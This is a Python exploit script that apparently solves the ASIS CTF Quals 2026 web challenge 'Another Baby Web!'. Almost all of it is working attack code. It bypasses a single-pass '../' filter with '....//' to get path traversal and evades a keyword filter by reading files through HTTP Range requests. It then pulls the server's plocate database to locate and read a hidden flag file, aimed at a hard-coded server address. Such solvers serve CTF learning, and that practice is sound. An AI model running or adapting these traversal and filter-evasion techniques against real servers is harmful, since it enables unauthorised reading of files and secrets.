#!/usr/bin/env python3
"""
Another Baby Web!  --  ASIS CTF Quals 2026  (Web)

End-to-end solver.

The service (see ../challenge/app.py) exposes GET /inspect?path=... , a local file
read guarded by three checks, each buggy:

  1. resolve():   user_path.replace("../", "")  is a SINGLE pass  ->  "....//" survives
                  as "../"  ->  full path traversal out of the /app web-root.
  2. bad_data():  rejects any response body containing b"ASIS" or b"lib"  ->  bypassed
                  with an HTTP Range header (send_file is called with conditional=True,
                  so it honours Range, and the app re-reads response.get_data()).
  3. is_forbidden(): blocks /etc /dev /proc /entrypoint.sh  --  genuinely airtight
                  (the hard-coded "/app" prefix makes a leading "//" impossible), so
                  the flag is NOT there; those are red herrings.

The two obvious flags (/flag.txt, /app/flag.txt) are decoys.  The real flag lives in a
RANDOMLY named directory, unguessable by brute force.  The Ubuntu image ships `plocate`
(with an updatedb timer): its database at /var/lib/plocate/plocate.db indexes the whole
filesystem -- including the hidden flag.  We pull that DB over the LFI, parse it, and
read the flag it points to.

Requires: python3 (stdlib only) and the `zstd` CLI on PATH.

Usage:  python3 solve.py [host] [port]
"""
from __future__ import annotations
import base64
import json
import os
import re
import struct
import subprocess
import sys
import tempfile
import urllib.parse
import urllib.request

HOST = sys.argv[1] if len(sys.argv) > 1 else "91.107.191.73"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 29994
BASE = f"http://{HOST}:{PORT}"


# --------------------------------------------------------------------------- #
# LFI read primitive
# --------------------------------------------------------------------------- #
def _get(path: str, rng: str):
    """One /inspect request. Returns (http_status, body_bytes_or_None)."""
    url = f"{BASE}/inspect?path=" + urllib.parse.quote(path, safe="")
    req = urllib.request.Request(url, headers={"Range": rng})
    try:
        resp = urllib.request.urlopen(req, timeout=15)
        data = json.loads(resp.read())
        if "content" in data:
            return 200, base64.b64decode(data["content"])
        return resp.status, None
    except urllib.error.HTTPError as e:
        return e.code, None
    except Exception:
        return None, None


def to_abs(abs_path: str) -> str:
    """
    Turn a real absolute path into an /inspect `path` argument.

    resolve() prepends CHALLENGE_DIR="/app" then strips one "../".  "/....//" thus
    becomes "/../" and cancels the /app prefix, landing us at "/".  Everything under
    /app is read with a plain leading "/".
    """
    if abs_path.startswith("/app/"):
        return abs_path[len("/app"):]          # /app/x -> /x
    return "/....//" + abs_path.lstrip("/")     # /x -> escape /app, read root


def _size(ipath: str) -> int:
    """File length via the bytes=N-N oracle (200 iff byte N exists)."""
    def has(n):
        return _get(ipath, f"bytes={n}-{n}")[0] == 200
    if not has(0):
        return 0
    lo, hi = 0, 1
    while has(hi):
        lo, hi = hi, hi * 2
    while lo + 1 < hi:                           # first absent offset == size
        mid = (lo + hi) // 2
        lo, hi = (mid, hi) if has(mid) else (lo, mid)
    return hi


def read_file(abs_path: str) -> bytes:
    """
    Read a whole file, defeating bad_data() (b"ASIS"/b"lib") and the 64 KiB cap.

    A window that returns 400 held a blocked substring or exceeded the cap, so we
    recurse; a single byte can never trip either, so recursion terminates on real
    bytes.  We size the file first so we never read past EOF.
    """
    ipath = to_abs(abs_path)
    size = _size(ipath)
    if size == 0:
        return b""

    def rng(a: int, b: int) -> bytes:
        if a > b:
            return b""
        st, body = _get(ipath, f"bytes={a}-{b}")
        if st == 200 and body is not None:
            return body
        if a == b:                              # in-range single byte always readable
            st2, body2 = _get(ipath, f"bytes={a}-{a}")
            return body2 if body2 else b"\x00"
        mid = (a + b) // 2
        return rng(a, mid) + rng(mid + 1, b)

    import concurrent.futures as _cf
    win = 60000
    nwin = (size + win - 1) // win
    with _cf.ThreadPoolExecutor(max_workers=8) as ex:
        parts = list(ex.map(lambda k: rng(k * win, min((k + 1) * win, size) - 1),
                            range(nwin)))
    return b"".join(parts)


def exists(abs_path: str) -> bool:
    """bytes=0-0 oracle: 1 byte can never trip bad_data/size, so 200 <=> file exists."""
    return _get(to_abs(abs_path), "bytes=0-0")[0] == 200


# --------------------------------------------------------------------------- #
# plocate.db parsing
# --------------------------------------------------------------------------- #
def parse_plocate(db: bytes) -> list[str]:
    """Parse a plocate.db: decompress every dictionary-compressed filename frame."""
    assert db[:8] == b"\x00plocate", "not a plocate db"
    num_docids,            = struct.unpack_from("<I", db, 20)
    filename_index_offset, = struct.unpack_from("<Q", db, 32)
    zstd_dict_len,         = struct.unpack_from("<I", db, 44)
    zstd_dict_off,         = struct.unpack_from("<Q", db, 48)
    dictionary = db[zstd_dict_off:zstd_dict_off + zstd_dict_len]
    offs = list(struct.unpack_from(f"<{num_docids}Q", db, filename_index_offset))
    offs.append(filename_index_offset)          # sentinel: end of last frame

    with tempfile.TemporaryDirectory() as tmp:
        dict_path = os.path.join(tmp, "dict.bin")
        open(dict_path, "wb").write(dictionary)
        frame_paths = []
        for i in range(num_docids):
            fp = os.path.join(tmp, f"f{i:04d}.zst")
            open(fp, "wb").write(db[offs[i]:offs[i + 1]])
            frame_paths.append(fp)
        # one batched zstd invocation decompresses all frames with the dictionary
        rc = subprocess.run(["zstd", "-dq", "-f", "-D", dict_path, *frame_paths],
                            capture_output=True)
        if rc.returncode != 0 and b"No such file" in rc.stderr:
            sys.exit("error: the `zstd` CLI is required (brew install zstd / apt install zstd)")
        names = []
        for i in range(num_docids):
            op = os.path.join(tmp, f"f{i:04d}")     # zstd strips the .zst suffix
            if os.path.exists(op):
                names += [s for s in open(op, "rb").read().split(b"\x00") if s]
        return [s.decode("utf-8", "replace") for s in names]


# --------------------------------------------------------------------------- #
# main
# --------------------------------------------------------------------------- #
def main() -> None:
    print(f"[*] target {BASE}")

    # sanity: prove the two decoys and the traversal + Range bypass work
    for p in ("/app/flag.txt", "/flag.txt"):
        body = read_file(p)
        print(f"[*] decoy {p:15} = {body.decode(errors='replace').strip()!r}")

    # pull the locate database over the LFI
    DB = "/var/lib/plocate/plocate.db"
    if not exists(DB):
        sys.exit("[-] plocate.db not present")
    print(f"[*] downloading {DB} ...")
    db = read_file(DB)
    print(f"[*] got {len(db)} bytes; parsing ...")
    files = parse_plocate(db)
    print(f"[*] locate db indexes {len(files)} paths")

    # the real flag: a flag file NOT at the two decoy paths
    decoys = {"/flag.txt", "/app/flag.txt"}
    candidates = [f for f in files if re.search(r"flag", f, re.I) and f not in decoys]
    print(f"[*] flag-ish paths: {candidates}")

    for path in candidates:
        if not path.endswith(("flag.txt", "flag")):
            continue
        body = read_file(path)
        if b"{" in body:
            print(f"\n[+] {path}")
            print(f"[+] FLAG: {body.decode(errors='replace').strip()}")
            return
    print("[-] flag not recovered; inspect candidates above")


if __name__ == "__main__":
    main()
